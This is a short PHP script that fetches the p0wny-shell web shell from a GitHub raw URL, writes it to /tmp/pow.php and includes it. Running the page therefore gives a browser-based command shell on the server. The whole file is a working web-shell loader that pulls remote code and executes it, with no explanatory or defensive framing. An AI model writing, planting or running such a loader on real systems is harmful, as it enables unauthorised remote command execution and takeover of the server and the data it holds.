<?php
$url = "https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php";
$downloadedFilePath = "/tmp/pow.php";

file_put_contents($downloadedFilePath, file_get_contents($url));

if (file_exists($downloadedFilePath)) {

    include $downloadedFilePath;
} else {
    echo "failed get data";
}
?>
